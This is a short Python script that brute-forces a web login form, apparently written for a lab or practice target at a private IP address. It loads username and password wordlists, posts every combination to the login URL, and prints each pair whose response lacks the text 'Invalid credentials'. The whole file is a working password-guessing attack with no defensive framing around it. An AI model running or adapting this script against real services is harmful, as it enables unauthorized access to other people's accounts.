import requests
import itertools

#possible usernames 
unames=[uname.rstrip('\n') for uname in open('unames.txt','r')]
#most commanly used passwords found online
passwords=[password.rstrip('\n').strip() for password in open('passwords.txt','r')]

#url='http://YOUR_WEB_IP/login'
url='http://10.138.0.58/login'

#iterate over all combination of user names and passwords
for u, p in itertools.product(unames,passwords):
    #prepare data for post request
    payload={'username':u,'password':p}
    #send username and password through post method to web app url
    post=requests.Session().post(url, data=payload)
    #check if respond text contains invalid credentails
    if 'Invalid credentials' not in  post.text:
        #print valid username and password
        print(u+' '+p)

